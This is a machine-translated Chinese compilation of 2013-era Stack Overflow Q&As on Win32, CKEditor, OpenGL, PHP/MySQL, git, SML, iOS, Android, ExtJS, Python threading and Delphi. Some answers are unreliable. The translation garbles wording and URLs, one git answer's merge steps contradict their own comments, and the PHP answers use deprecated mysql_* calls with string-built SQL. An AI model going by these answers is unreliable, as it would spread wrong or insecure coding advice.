我正在使用要处理项目扩展或折叠的树控件，最后我发现树向它的父窗口发送通知 TVN_ITEMEXPANDING，如本页所述[http://msdn.microsoft.com/en-美国/图书馆/windows/desktop/bb773537(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/bb773537(v=vs.85).aspx)

我正在编写一个树类，它将在其他窗口中重用并继承我想独立于它的父级来处理树的 wndProc 事件。像.NET

如何才能做到这一点？？

我从 OWL 库的 TTreeWindow 类继承我现在依赖于托管它在其 wndProc 中接收通知的树的对话框

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T15:34:07.700

您不能使 Win32 控件向控件而不是其父控件发送通知。这就是 Win32 通知消息的工作原理。

WinForms、VCL 等框架所做的是安排父控件将通知消息*反射*回子控件。

我猜 OWL 不会做这个通知消息反射。如果你打算使用一个框架，逆流而上是没有意义的。我建议您最好遵循框架标准方法。

# ckeditor - CKEditor - 自动删除空锚

> ID：15998503
> 
> 赞同：2
> 
> 时间：2013-04-14T11:20:52.387
> 
> 标签：ckeditor

据我了解，CKEditor 会自动删除一个空锚。问题是很多 HTML 插件都使用空锚点，并在页面加载后将它们存储在 JavaScript 中。

例如，如果我喜欢使用 AddThis 他们让我添加下一个代码：

```
<div class="addthis_toolbox addthis_default_style ">
    <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
    <a class="addthis_button_tweet"></a>
    <a class="addthis_button_pinterest_pinit"></a>
    <a class="addthis_counter addthis_pill_style"></a>
</div> 
```

在我将显示从 Source 更改为 Design 之后，CKEditor 正在删除所有锚点。

我知道如果我将添加到锚点，CKEditor 不会删除它们，但在我的情况下我不能使用它。

我找到了删除文件中链接的行：/ckeditor/ckeditor_4.0.1_full_source/core/htmldataprocessor.js Lines: 536-540

他们正在添加一个删除任何空锚点的 htmlFilter 规则。现在，我知道我可以编辑 CKEditor 源文件并更改它，但我不喜欢这样做，因为任何时候我要升级一个版本，我都需要使用相同的修复程序，所以我喜欢使用 CKEditor API 修复它。

我找到了如何通过以下方式添加规则：

```
CKEDITOR.instances['instanceName'].dataProcessor.dataFilter.addRules(
            {
                elements :
                {
                    a : function( element )
                    {
                        //Do what i like to do
                    }
                }
            }); 
```

问题是，即使我为 A TAG 添加规则，它仍然不会覆盖 CKEditor 制定的规则。

有没有办法覆盖那里的规则或以另一种方式解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-07T06:20:20.060

尝试在标签上使用随机名称：

```
<div class="addthis_toolbox addthis_default_style ">
    <a class="addthis_button_facebook_like" fb:like:layout="button_count" name="at_r"></a>
    <a class="addthis_button_tweet" name="at_t"></a>
    <a class="addthis_button_pinterest_pinit" name="at_p"></a>
    <a class="addthis_counter addthis_pill_style" name="at_c"></a>
</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-29T15:35:29.277

我想出了一个解决方案。您需要使用来自 shopify (gem liquid) 的液体代码解析器，而且它真的很容易做到。安装 gem 后，您可以执行以下操作：

```
<%= Liquid::Template.parse(your_ckeditor_content).render({
   code_you_want_untouched => %Q{ html code here }
}) %> 
```

用该行替换您当前的 CKEditor 输出代码。

然后，您现在将“code_you_want_untouched”作为可在 CKEditor 中使用的变量。

您在 CKeditor 内容中这样称呼它：

```
{{ code_you_want_untouched }} 
```

由于 html 代码不再来自 CKEditor，因此它不会剥离任何内容。关于液体的最酷的部分是您可以使用任意数量的变量，并且您可以在变量代码中执行 Ruby。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-01-14T00:29:56.800

我有同样的问题，我让它停止删除空标签的唯一方法是将它添加到 config.js

```
config.protectedSource.push(/<a[^>]*><\/a>/g);
enterCKEDITOR.dtd.$removeEmpty.a = 0; 
```

注意：然而，在我的 cke 中，背景图像不会出现在编辑器中。他们工作得很好，他们只是没有出现。我希望它只是一个可以修复的错误。

# opengl - 如何知道特定扩展是否被提升为核心配置文件，是从一开始就成为核心扩展还是作为遗留扩展被删除？

> ID：15998505
> 
> 赞同：2
> 
> 时间：2013-04-14T11:21:00.503
> 
> 标签：opengl

我正在使用 OpenGL 3.3 的核心前向兼容配置文件。支持的扩展列出了 GL_ARB_MULTITEXTURE 和类似的扩展（在 OpenGL wiki 的 OpenGL 3.1 中标记为已删除），但为什么我的驱动程序报告此扩展可用？此外，GL_NV_primitive restart 报告为可用，但它不能与服务器端 OpenGL 3+ 一起使用。那么驱动程序是否可以将任意扩展报告为受支持，即使它们不应该可用或不可用？

我的结论是我不能依赖驱动程序提供有关扩展的正确信息。此外，标准规定驱动程序也没有义务报告核心扩展，但它可能。

现在，如果我使用核心配置文件将扩展报告为 GL 版本 ab 的 GL_foo_bar，我如何知道它是否不是该特定设置的旧扩展，我如何知道该特定扩展是否还不是 ab 的一部分核。

此伪代码不能在不同的 OpenGL 之间移植：版本：if(GL_foo_bar == TRUE) 将在 OpenGL 2 中工作，如果 GL_foo_bar 是核心的一部分并且驱动程序未报告为可用，则可能无法在 OpenGL3+ 上工作。我找不到一种万无一失的方法来知道该特定扩展是否真的不受支持或根本没有报告，所以如果我不希望每个 GL 函数调用之间有多个 if，我似乎需要一个单独的渲染路径。

题外话：为什么 glGetString(Gl_EXTENSIONS) 与我的核心配置文件一起使用？我认为不应该。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:37:36.887

扩展名不会“删除”。您的实现支持它想要的任何扩展，无论它是否对当前版本的 OpenGL 有意义。

> 我的结论是我不能依赖驱动程序提供有关扩展的正确信息。此外，标准规定驱动程序也没有义务报告核心扩展，但它可能。

这个结论似乎是从错误的方向来解决问题的。版本和扩展对你来说只有一个方面很重要：*你*想支持什么？

如果您不打算使用 NV_primitive_restart，那么核心 OpenGL 实现是否在扩展字符串中提及它与您完全无关。您不应该关心扩展字符串是否提到 ARB_multitexture ，除非您希望根据它是否存在来做不同的事情。

如果您支持 GL 2.1，那么您需要确定您希望支持哪些扩展，无论是有条件的还是根据需要的功能。然后根据这些扩展和版本号编写代码。

> 如果 GL_foo_bar 是核心的一部分

除非 GL_foo_bar 是[核心 OpenGL 扩展](http://www.opengl.org/wiki/Extension#Core_Extensions)，否则它*永远不是*“核心的一部分”。扩展背后的功能可以提升为核心，但扩展和核心功能仍然*不同*。这就是为什么它们有后缀。

来自 ARB_vertex_buffer_object 的缓冲区对象功能在 1.5 中被提升为核心 OpenGL。但是 ARB_vertex_buffer_object 暴露的函数*的*行为与核心 OpenGL 暴露的类似函数的行为不同。GL 3.1 允许这样做：`glBindBuffer(GL_UNIFORM_BUFFER, buffer);`. 调用它`glBindBufferARB` *可能会*起作用（很可能，它可能会起作用），但不能*保证*它会起作用，无论 OpenGL 版本号或是否存在某种扩展组合。

这就是存在核心扩展的原因。这样您就可以调用相同的函数并获得相同的行为。如果存在扩展或 OpenGL 版本 >= 适当的数字，则可以使用相同的功能。所以一般的伪代码是这样的：`if(gl::exts::ARB_uniform_buffer_object || gl::VersionGEQ(3, 1))`.

# opengl-es-2.0 - 如何在有和没有 VBO 的情况下混合绘图

> ID：15998510
> 
> 赞同：0
> 
> 时间：2013-04-14T11:21:23.187
> 
> 标签：opengl-es-2.0

由于 OpenGL 绘图调用受最近绑定的 VBO 的影响，如果您还想绘制现场动态创建的不在 VBO 中的顶点，如何取消绑定 VBO？

我看过的所有示例都没有显示如何禁用 VBO 缓冲区，就像使用属性数组指针一样。也许这不是特别常见，因为大多数应用程序要么将所有内容都包含在 VBO 中，要么什么都没有，也许混合这两种场景并不常见。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-04T15:55:12.820

还要记住在混合 VBO 和非 VBO 时禁用属性指针。你打电话时：

```
GLES20.glEnableVertexAttribArray(positionHandle); 
```

后面应该跟一个：

```
GLES20.glDisableVertexAttribArray(positionHandle); 
```

完成绘图后，您可以使用其他绘图方法（VBO 或非 VBO）重新启用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T17:24:45.560

要取消绑定 VBO，只需将`glBindBuffer`第二个参数设置为 0 即可。

> 零值是保留的，但每个缓冲区对象目标没有默认缓冲区对象。相反，缓冲区设置为零有效地取消绑定以前绑定的任何缓冲区对象，并恢复该缓冲区对象目标的客户端内存使用。

然后你必须绑定另一个 VBO 或从客户端内存中提取。

# php - 如何将数据转移到另一个文件 PHP

> ID：15998514
> 
> 赞同：-1
> 
> 时间：2013-04-14T11:21:58.803
> 
> 标签：php, mysql

我有一个执行以下操作的 php 文件。

```
$sql = mysql_query("SELECT * FROM  `players` WHERE  `Banned` = 1");
  while($row = mysql_fetch_array($sql)) {
$username = $row['Username'];
$lastip = $row['LastIP'];
$level = $row['Level'];

echo "<tr>";
echo "<td>$username</td>";
if ($lastip > 1){
    echo "<td>$lastip</td>";
} else {
    echo '<td>No IP found!</td>';
}
echo "<td>$level</td>";
echo "<td>Country</td>";
echo "<td><a href='unban.php'>Unban</a></td>";
echo "</tr>";
} 
```

我想让 unban,php unban 用户的 IP 地址，但我不知道如何将数据传送到 unban.php

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:23:41.807

你可以做一个：

```
echo "<td><a href='unban.php?ip=" . $lastip . "'>Unban</a></td>"; 
```

在文件 unban.php 中，您可以使用`$_GET['ip']`在 URL 中传递的密钥 ip 获取 QueryString 值。

如果您在数据库中有一个 ID，请使用该 ID 将其传递给 unban.php。

有两种请求类型可以将数据传递到另一个页面，$_GET 和 $_POST。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:25:53.303

您可以轻松使用：

```
include("filename") into your unban.php 
```

或使用会话：

```
$_SESSION["name"]=data; 
```

或使用表单或直接通过url（但如果重要信息不需要使用它）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T11:25:56.757

在 url 中的 get 参数中传递用户名，以便您可以识别用户，例如：href='unban.php?username={$username}'

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-14T11:29:41.977

您的代码可能：

```
echo "<td><a href='unban.php?ip=" . $lastip . "&username=" . $username . "'>Unban</a></td>"; 
```

脚本和查询 unban 会是这样的：

```
$lastip = mysql_real_escape_string($_GET['ip']);
$username = mysql_real_escape_string($_GET['username']);
$sql = mysql_query("UPDATE `players` SET  `banned` = '0' where LastIP='$lastip' and username='$username'") or die(mysql_error()); 
```

# git - Git合并多个分支

> ID：15998518
> 
> 赞同：0
> 
> 时间：2013-04-14T11:22:23.420
> 
> 标签：git

我有以下分支：

```
master
featureA
featureB 
```

在多个 git 存储库上。开发同时发生在所有三个分支上。我需要将**featureA**合并到**featureB**中，最后将**featureB**合并到**master**中。目前我做：

切换到**featureB并从****featureA**合并。切换到**master并从****featureB**合并。此过程涉及 2 个开关，由于我需要为大约 7 个存储库执行此操作，因此需要一些时间。

有没有更好的方法使用 git 来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:12:59.867

这听起来有点不正常。如果您有六七个开发人员都在开发 featureA 或 featureB，那么他们应该已经相互同步了。也就是说，在开发过程中，它们相互推/拉或通过指定的中央存储库间接地推/拉。这就是他们在开发功能时协同工作的方式。

在这种情况下，唯一剩下的是：

```
# your 4 steps
git checkout featureB
git merge featureA
git checkout master
git merge featureB 
```

在此之后，每个开发人员都拉出 master，他们可以删除 featureA 和 featureB 或者直接放弃它们。

开发继续进行，每个开发人员都从 master 创建新的功能分支

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T11:25:35.323

您需要在 7 个存储库中的每一个上执行两个步骤。听起来像是编写 shell 脚本以在每个 repo 中为您运行必要的 git 命令的好案例。只要你的仓库是分开的，我不认为 git 本身对你有什么好处。您还可以考虑通过“子模块”连接它们（尽管我不确定它是否会有所帮助）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-07-04T04:31:32.230

Git 本身并没有太多简化多个分支合并的方式。为此，我编写了一个名为 Cascade 的小型 CLI。

Casecade-CLI：[https ://www.npmjs.com/package/cascade-cli](https://www.npmjs.com/package/cascade-cli)

您提到的工作流程似乎非常常见、烦人，并且可能有些耗时。CLI 将从主机中提取每个分支（如果可用）、合并，然后将每个分支推回主机（如果可用）。它仍处于起步阶段，但我计划扩展其功能并希望解决这个反复出现的问题。

用法：

```
cascade merge <head> <toBranches...> 
```

例子：

```
cascade merge featureA featureB master 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-05-29T00:29:30.800

尝试运行此命令：

*   git结账大师
*   git 合并特征A 特征B

您可以一步合并所有您想要的分支。只需创建一个合并链：

*   git 合并 abcde

将合并当前分支中的分支 a、b、c、d 和 e。

如果其中一个主题导致冲突，则合并失败。明显地。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-05-28T08:12:27.137

我推荐的合并顺序如下。

```
//merge master to featureA
git checkout master
git merge featureA

//merge featureA to master
git checkout featureA
git merge master

//merge master to featureB
git checkout master
git merge featureB

//merge featureB to master
git checkout featureB
git checkout master 
```

这样，featureA 和 featureB 的修改都被安全地合并到 master 中。此外，即使事先有任何主修改，也不会发生合并丢失。

但是，顺序很复杂。这就是为什么如果手动操作可能会出错。好像有自动下单的工具，请用谷歌搜索。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-02-18T09:02:47.333

您可能想要使用自动[shell 合并脚本](https://gist.github.com/adamreisnz/9bc7b1f88fd2741293bb6a29ea65dfa9)或查看如何[合并](https://stackoverflow.com/questions/1425892/how-do-you-merge-two-git-repositories)或[组合](https://stackoverflow.com/questions/277029/combining-multiple-git-repositories)两个 repos。

# sml - 为什么此代码的输出中有意外的“#”？

> ID：15998529
> 
> 赞同：3
> 
> 时间：2013-04-14T11:24:19.290
> 
> 标签：sml, smlnj

我正在尝试创建一个派生函数来区分使用数据类型，如下所示：

```
datatype Symex = RCOEFF of real
               | COEFF  of string
               | VAR    of string
               | POWER  of Symex * int
               | NEG    of Symex
               | PLUS   of Symex * Symex
               | MINUS  of Symex * Symex
               | MULT   of Symex * Symex
               | DIVIDE of Symex * Symex 
```

这是 a*x^3 + 4.0*x^2 +b*x +c 的示例

```
PLUS (MULT (COEFF ("a"),
            POWER (VAR ("x"), 3)),
      PLUS (MULT (RCOEFF (4.0),
                  POWER (VAR ("x"), 2)),
            PLUS (MULT (COEFF ("b"),
                        VAR ("x")),
                  COEFF ("c")))) 
```

我的代码的一部分是

```
fun deriv (POWER(a, b)) = MULT(RCOEFF(Real.fromInt(b)), POWER(a, b-1)) 
```

但是当我计算

```
deriv(POWER(VAR "x", 3)) 
```

输出是

```
MULT(RCOEFF 3.0 , POWER(VAR # , 3)) 
```

为什么输出中有一个“#”？

请任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-14T13:23:34.997

SML/NJ 对打印到控制台的深度结构有限制。如果达到此限制，`#`则使用 a 表示结构较大，但未显示。

如果您认为限制太低，您可以通过将存储的值更新为`Control.Print.printDepth`更适合您的值来更改它。

```
Standard ML of New Jersey v110.69 [built: Mon Jun  8 14:15:08 2009]

- datatype 'a ls = Nil | Cons of 'a * 'a ls;
datatype 'a ls = Cons of 'a * 'a ls | Nil

- Cons(1, Cons(2, Cons(3, Cons(4, Nil))));
val it = Cons (1,Cons (2,Cons #)) : int ls

- Control.Print.printDepth;
val it = ref 5 : int ref

- Control.Print.printDepth := 100;
val it = () : unit

- Cons(1, Cons(2, Cons(3, Cons(4, Nil))));
val it = Cons (1,Cons (2,Cons (3,Cons (4,Nil)))) : int ls 
```

# mysql - MYSQL【修改USER TABLE带来的错误】

> ID：15998532
> 
> 赞同：0
> 
> 时间：2013-04-14T11:25:05.093
> 
> 标签：mysql, syntax-error, create-table

我正在尝试学习网络旅游的简单课程。我试图根据我的需要修改给出的代码。它会通过修改吐出错误：

> #1064 - 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以获取在 ''id')、UNIQUE KEY ('email')、KEY ('email'、'pass') ) ENGINE = MYISAM DEFAULT ' 在第 13 行附近使用的正确语法

原始代码：

```
CREATE TABLE `users` ( 
`id` int(11) NOT NULL auto_increment, 
`username` varchar(30) NOT NULL default '', 
`password` varchar(255) NOT NULL default '', 
`email` varchar(40) NOT NULL default '', 
`msn` varchar(250) NOT NULL default 'Not Specified', 
`aim` varchar(250) NOT NULL default 'Not Specified', 
`location` varchar(36) NOT NULL default 'Not Specified', 
PRIMARY KEY (`id`) 
) TYPE=MyISAM; 
```

我的编辑：

```
CREATE TABLE `users` (
`id` INT UNSIGNED NOT NULL AUTO_INCREMENT ,
type ENUM( 'member' , 'admin' ) NOT NULL ,
`username` varchar(30) NOT NULL default '',
`password` varchar(255) NOT NULL default '',
`first_name` varchar (15) NOT NULL,
`last_name` varchar (30) NOT NULL,
`gender` ENUM('male',  'female') NOT NULL default 'male',
`email` varchar(50) NOT NULL default '',
`skype` varchar(50) NOT NULL default 'Not Specified',
`facebook` varchar(150) NOT NULL default 'Not Specified',
`location` varchar(100) NOT NULL default 'Not Specified',
PRIMARY KEY ('id'),
UNIQUE KEY ('email'),
KEY ('email', 'pass')
) ENGINE = MYISAM DEFAULT CHARSET = utf8; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T17:28:34.927

您正在混淆反引号和引号。这是生活的一般规则：反引号用于包围表结构（表名、表列、约束名等）。引号用于将行***值***括起来- 也就是输入到表中的实际数据。***除非指定默认值***，否则不会在 DDL 语句中使用引号。

您的错误在于语句中的主键、唯一键和索引键。

```
PRIMARY KEY ('id'),
UNIQUE KEY ('email'),
KEY ('email', 'pass') 
```

应该是（注意反引号）：

```
PRIMARY KEY (`id`),
UNIQUE KEY (`email`),
KEY (`email`, `password`) 
```

另请注意，您的索引指的是不存在的列`pass`- 我已将其更改为正确的列`password`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T11:29:17.720

你对反引号发疯了

```
default '', 
```

两个单引号是空字符串 BackTicks 用于列名，例如

> `My Strange column name`

# ios - 如何通过另一个视图的内容来掩盖一个视图的图层？

> ID：15998536
> 
> 赞同：4
> 
> 时间：2013-04-14T11:25:49.913
> 
> 标签：ios, uiview, uiimageview, calayer

我有一个 UIImageView 和一个 UILabel，并希望 UILabel 的内容来掩盖 UIImageView。目标是文本与图像内容一起可见，但其他所有内容都是透明的。

有没有一种简单的方法可以用另一个视图的内容来掩盖一个视图？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-14T11:59:16.753

您可以使用`QuartzCore Framework`.

（链接项目`QuartzCore.framework`并导入 <QuartzCore/QuartzCore.h>）。

```
@import QuartzCore; 
```

标签的背景必须是清晰的颜色。例子：

```
self.imageView.layer.mask = self.label.layer;
self.imageView.layer.masksToBounds = YES; 
```

**在界面生成器中：**

![在此处输入图像描述](https://i.stack.imgur.com/p3OiA.jpg)

**在设备上：**

![在此处输入图像描述](https://i.stack.imgur.com/PwyLX.jpg)

# android - 添加 publish_action 权限并在墙上发布

> ID：15998539
> 
> 赞同：0
> 
> 时间：2013-04-14T11:25:57.927
> 
> 标签：android, facebook

我有一个有两个按钮的活动

1.  用于登录 facebook。登录后我完成了那个活动
2.  其他按钮用于张贴到墙上

第一部分我做得很好，但第二部分我参考了 facebook 样本并尝试将发布权限添加到我的开放会话中，如下所示

```
private void performPublish(PendingAction action) {
    Session session = Session.getActiveSession();
    if (session != null) {
        pendingAction = action;
        if (hasPublishPermission()) {
            // We can do the action right away.
            handlePendingAction();
        } else {
            // We need to get new permissions, then complete the action when we get called back.
            session.requestNewPublishPermissions(new Session.NewPermissionsRequest(this, PERMISSIONS));
        }
    }
} 
```

但我收到以下错误

```
 04-14 16:49:18.760: E/AndroidRuntime(2529): FATAL EXCEPTION: main
    04-14 16:49:18.760: E/AndroidRuntime(2529): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.smartcloud/com.smartcloud.HelloFacebookSampleActivity}: java.lang.UnsupportedOperationException: Session: an attempt was made to request new permissions for a session that has a pending request.
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1751)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1767)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at android.app.ActivityThread.access$1500(ActivityThread.java:122)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1005)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at android.os.Handler.dispatchMessage(Handler.java:99)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at android.os.Looper.loop(Looper.java:132)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at android.app.ActivityThread.main(ActivityThread.java:4028)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at java.lang.reflect.Method.invokeNative(Native Method)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at java.lang.reflect.Method.invoke(Method.java:491)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:844)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:602)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at dalvik.system.NativeStart.main(Native Method)
    04-14 16:49:18.760: E/AndroidRuntime(2529): Caused by: java.lang.UnsupportedOperationException: Session: an attempt was made to request new permissions for a session that has a pending request.
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at com.facebook.Session.requestNewPermissions(Session.java:968)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at com.facebook.Session.requestNewPublishPermissions(Session.java:501)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at com.smartcloud.HelloFacebookSampleActivity.performPublish(HelloFacebookSampleActivity.java:194)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at com.smartcloud.HelloFacebookSampleActivity.onClickPostStatusUpdate(HelloFacebookSampleActivity.java:161)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at com.smartcloud.HelloFacebookSampleActivity.onCreate(HelloFacebookSampleActivity.java:89)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1048)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1715)
    04-14 16:49:18.760: E/AndroidRuntime(2529):     ... 11 more 
```

请帮帮我！它对我来说真的很重要

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:18:40.313

`session`在请求新权限之前，您需要等到打开。您可以使用[statusCallback](https://developers.facebook.com/docs/reference/android/3.0/Session.StatusCallback)并检查会话何时打开（在`call`方法中），然后请求新权限。

# javascript - ExtJS 面板布局：如何正确布局面板

> ID：15998540
> 
> 赞同：1
> 
> 时间：2013-04-14T11:26:04.323
> 
> 标签：javascript, extjs, extjs4, extjs4.1

我正在尝试渲染一个占据整个水平空间的[面板](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.panel.Panel)A。然后我尝试在面板 A 下方渲染两个面板 B 和 C，它们都占据了 50% 的水平空间。

因此，我要实现的是这样的结构：

```
-------------
|     A     |
-------------
|  B  |  C  |
------------- 
```

[但如this fiddle](http://jsfiddle.net/jvzammit/9VMRm/3/)所示，我正在实现以下面板渲染：

```
-------------
|     A     |
-------------
|     B     |
-------------
|     C     |
------------- 
```

请随意分叉[小提琴](http://jsfiddle.net/jvzammit/9VMRm/3/)以实现我需要的对齐，如上所述。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T15:22:50.463

有这样的观点怎么样：

```
Ext.define('MyApp.view.MyContainer', {
    extend: 'Ext.container.Container',
    padding: 10,
    layout: {
        align: 'stretch',
        pack: 'center',
        type: 'vbox'
    },

    initComponent: function() {
        var me = this;

        Ext.applyIf(me, {
            items: [
                {
                    xtype: 'panel',
                    flex: 1,
                    height: 150,
                    title: 'A'
                },
                {
                    xtype: 'container',
                    flex: 1,
                    height: 150,
                    layout: {
                        padding: '10 0 10 0',
                        align: 'stretch',
                        type: 'hbox'
                    },
                    items: [
                        {
                            xtype: 'panel',
                            flex: 1,
                            width: 150,
                            title: 'B'
                        },
                        {
                            xtype: 'panel',
                            flex: 1,
                            width: 150,
                            title: 'C'
                        }
                    ]
                }
            ]
        });
        me.callParent(arguments);
    }
}); 
```

# python - 多线程 Python 应用程序的通用异常处理程序

> ID：15998541
> 
> 赞同：0
> 
> 时间：2013-04-14T11:26:14.973
> 
> 标签：python, multithreading, python-multithreading

是否可以使用通用异常处理程序捕获 Python 应用程序的所有线程的异常？

考虑以下示例。我想`CTRL+C`从主线程中捕获，但有时它会被一个不会终止其他线程的工作线程捕获。这是这种情况下的输出：

```
^CTraceback (most recent call last):
  File "thread-example.py", line 50, in <module>
    main()
  File "thread-example.py", line 30, in main
    t.join(1)
  File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py", line 675, in join
    self.__block.wait(delay)
  File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py", line 263, in wait
    _sleep(delay)
KeyboardInterrupt 
```

这是测试应用程序。

```
#!/usr/bin/python

import os
import sys
import threading
import time
import subprocess
import signal

class Worker(threading.Thread):
    def __init__(self, name):
        threading.Thread.__init__(self)
        self.kill_received = False
        self.daemon = True
        self.name = name

    def run(self):
        while not self.kill_received:
            time.sleep(1)
            print self.name

def main():
    threads = []

    for i in xrange(10):
        t = Worker('worker-%d' % i)
        threads.append(t)
        t.start()
        t.join(1)

    while len(threads) > 0:
        try:
            threads = [t for t in threads if t is not None and t.isAlive()]
            time.sleep(1)
        except KeyboardInterrupt:
            print "Ctrl-c received! Sending kill to threads..."
            for t in threads:
                t.kill_received = True
            # wait for threads to finish gracefully, then kill them anyway.
            # since all threads are daemons, they should finish once the main 
            # loop terminates
            for i in xrange(5):
                print '%i ...' % (5-i)
                time.sleep(1)
            print 'Exit!'
            os._exit(1)

if __name__ == '__main__':
    main() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:29:36.087

Ctrl-C 本身并不是一个例外，而是一个信号。您可以做的是将除“主”线程之外​​的所有生成线程设置为忽略它，如下所示：

```
import signal
signal.signal(signal.SIGINT, signal.SIG_IGN) 
```

# delphi - 系统目录中的资源保存

> ID：15998542
> 
> 赞同：-2
> 
> 时间：2013-04-14T11:26:37.367
> 
> 标签：delphi

我有一个 Delphi XE2 项目来从 Windows 系统目录中的资源（资源名称 = DynamicLlinkLibraryWin32）中保存一个 DLL 文件（文件名 = MyFile.dll）。我定义了以下代码：

```
function GetSysDir: string;
var
  SystemDirectory: array[0..MAX_PATH] of Char;
begin
  GetSystemDirectory(SystemDirectory, MAX_PATH - 2);
  SetLength(Result, StrLen(SystemDirectory));
  Result := SystemDirectory;
end;

procedure TForm1.BitBtn01Click(Sender: TObject);
var
  ResStream: TResourceStream;
  ResourceSavingPathAndFileName01 : string;
begin
  ResourceSavingPathAndFileName01 := ExcludeTrailingPathDelimiter(GetSysDir);
  ResStream := TResourceStream.Create(HInstance, 'DynamicLlinkLibraryWin32', RT_RCDATA); {Resource Name=DynamicLlinkLibraryWin32}
  try
    ResStream.SaveToFile('ResourceSavingPathAndFileName01\MyFile.dll'); {File Name=MyFile.dll}
  finally
    ResStream.Free;
  end;
end; 
```

在运行时，我收到错误消息，提示“系统找不到指定的路径”。为什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T11:30:15.933

您正在保存到一个名为：

```
'ResourceSavingPathAndFileName01\MyFile.dll' 
```

因此系统将其视为相对路径，并且工作目录中似乎没有`'ResourceSavingPathAndFileName01'`包含命名的目录。

显然你的意思是写：

```
ResourceSavingPathAndFileName01+'\MyFile.dll' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T19:16:54.640

您没有正确格式化目标文件名，并且在确定正确的系统文件夹路径时根本没有考虑 WOW64。在 WOW64 模拟器下运行时，您必须使用`sysnative`别名从 32 位进程访问 64 位系统文件夹。在 32 位系统上的 32 位进程和 64 位系统上的 64 位进程中，`GetSystemDirectory()`将返回正确的路径。用于`IsWow64Process()`检测您的 32 位应用程序是否在 WOW64 下运行。

试试这个：

```
function GetSysDir: string;
var
  Buf: array[0..MAX_PATH] of Char;
  Len: UINT;
  S: String;
  {$IFNDEF WIN64}
  IsWow64: BOOL;
  {$ENDIF}
begin
  {$IFNDEF WIN64}
  IsWow64 := FALSE;
  if not IsWow64Process(GetCurrentProcess(), @IsWow64) then RaoseLastOSError;
  if IsWow64 then
  begin
    Len := GetWindowsDirectory(Buf, MAX_PATH);
    if Len = 0 then RaiseLastOSError;
    SetString(S, Buf, Len);
    Result := IncludeTrailingPathDelimiter(S) + 'Sysnative\';
    Exit;
  end;
  {$ENDIF}
  Len := GetSystemDirectory(Buf, MAX_PATH);
  if Len = 0 then RaiseLastOSError;
  SetString(S, Buf, Len);
  Result := IncludeTrailingPathDelimiter(S);
end;

procedure TForm1.BitBtn01Click(Sender: TObject);
var
  ResStream: TResourceStream;
begin
  ResStream := TResourceStream.Create(HInstance, 'DynamicLlinkLibraryWin32', RT_RCDATA);
  try
    ResStream.SaveToFile(GetSysDir + 'MyFile.dll');
  finally
    ResStream.Free;
  end;
end; 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-15T16:35:09.440

